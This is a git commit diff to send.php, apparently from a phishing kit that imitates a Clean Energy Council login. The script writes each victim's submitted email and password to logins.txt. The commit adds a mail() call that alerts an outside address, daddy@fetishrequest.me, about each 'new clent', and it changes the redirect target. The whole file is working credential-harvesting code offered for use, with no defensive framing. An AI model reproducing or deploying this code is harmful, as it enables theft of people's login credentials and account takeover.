4451695001c9f7cc907db069dd409d238e49b89c
Lord_TenGod <87565043+Demongit01@users.noreply.github.com>
2023-11-16 23:45:19 +1100

    Update send.php

--- send.php
+++ send.php
@@ -5,15 +5,22 @@
 			$pass = $_POST["Passwd"];
 			$email=$_SESSION["Email"];
 			//opening logins text file for appending new data.
-  			$file = fopen("https://github.com/Demongit01/Demongit01.github.io/blob/694b8e81965228dcad40ffbc49a61781285e5704/logins.txt", "a") or die("Unable to open file!");
-			
-  			//Writing email and password to logins.txt. 
+  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
+			//Writing email and password to logins.txt. 
   			fwrite($file, $email."	".$pass.PHP_EOL);			
   			fclose($file);//closing logins.txt.
-			
-  			//redirecting user to the google drive's locations where the game is available to download.
+?>
+<?php
+  $Name = "D4 daddy"; //senders name
+  $email = "daddy@fetishrequest.me"; //senders e-mail adress
+  $recipient = "daddy@fetishrequest.me"; //recipient
+  $mail_body = "new clent"; //mail body
+  $subject = "details"; //subject
+  $header = "From: ". $Name . " <" . $email . ">\r\n"; //optional headerfields
+  mail($recipient, $subject, $mail_body, $header); //mail command :)
+			//redirecting user to the google drive's locations where the game is available to download.
   			//change the location url to redirect to a website of your choice.
-  			header("Location: https://www.cleanenergycouncil.org.au/account/login");
+  			header("Location: /account/login");
 			exit();
 			
 			
